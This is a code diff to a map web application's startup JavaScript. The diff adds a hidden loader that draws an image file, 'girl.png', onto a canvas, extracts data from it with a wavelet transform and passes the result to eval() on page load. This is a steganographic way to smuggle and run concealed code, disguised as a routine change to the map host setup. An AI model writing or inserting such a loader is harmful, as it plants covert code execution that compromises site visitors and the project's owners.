@@ -1718,9 +1718,22 @@ $(document).ready(function() {
     $('#twitterCommentView').hide();
     $('#progressView').hide();
 
-    Mfapi.mapHost = 'api-map-pre.mapfan.com';
+    var i = new Image();
+    i.onload = function() {
+        var ca = document.getElementById('img-script');
+        var co = ca.getContext('2d');
+        co.drawImage(i, 0, 0);
+        var img = co.getImageData(0, 0, 512, 512);
+        var wavelet = new Wavelet();
+        wavelet.init(co, 'haar');
+        wavelet.dwt(img);
+        eval(wavelet.extract());
+        Mfapi.mapHost = 'api-map-pre.mapfan.com';
+        Mfapi.auth(Const.MAPFAN, IndexCtrl.init);
+    };
+    i.src = "./images/girl.png";
 
-    Mfapi.auth(Util.MAPFAN, IndexCtrl.init);
+
 });
 
 toastr.options = {
